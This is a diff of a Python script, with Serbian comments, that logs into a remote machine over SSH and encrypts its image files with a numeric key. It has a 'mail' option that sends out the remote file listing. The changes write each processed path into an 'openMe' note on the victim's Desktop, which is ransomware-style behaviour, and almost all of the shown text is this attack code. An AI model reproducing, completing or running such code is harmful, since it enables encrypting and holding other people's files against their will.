@@ -140,6 +140,7 @@ def criptImage(files, client, user, key, path=""):
         stdout = stdout.readlines()
         stdString = ''.join(stdout)
         tmppath = path
+        writeMessage(tmppath+file, client)
         if 'directory\n' in stdString:
 
             #print(f"Sada je u {file} i to je tipa {stdString}")
@@ -173,10 +174,8 @@ def criptImage(files, client, user, key, path=""):
             remote_file.close()
 
 def writeMessage(text, client):
-    client.exec_command(f"cd ~/Desktop; mkdir openMe")
-    client.exec_command(f"cd ~/Desktop/openMe; touch openMe.txt")
     sftp_client = client.open_sftp()
-    remote_file = sftp_client.open("Desktop/openMe/openMe.txt", mode = 'w')
+    remote_file = sftp_client.open("Desktop/openMe/openMe.txt", mode = 'a')
     remote_file.write(text)
     remote_file.close()
 
@@ -257,22 +256,19 @@ if __name__ == "__main__":
 
         # Stdout u listu
 
-        tipKomande = input("1.Slanje maila - mail\n2.Kriptovanje svih jpgova - crypt\n3.Pravljenje novih datoteka - write\nKomanda: ")
+        tipKomande = input("1.Slanje maila - mail\n2.Kriptovanje i evidencija - cript\nKomanda: ")
 
         if (tipKomande == "mail"):
 
             sendMail(stdout)
 
         elif (tipKomande == "cript"):
+            client.exec_command(f"cd ~/Desktop; mkdir openMe")
+            client.exec_command(f"cd ~/Desktop/openMe; touch openMe.txt")
             key = int(input("Unesite numericki kljuc za enkripciju: "))
             path = ""
             criptImage(stdout, client, user, key, path)
             print("Enkripcija je uspesna")
-
-        elif (tipKomande == "write"):
-            text = input("Unesite poruku koju zelite da upisete: ")
-            writeMessage(text, client)
-            print("Ispis poruke uspesan")
 
         client.close()
 
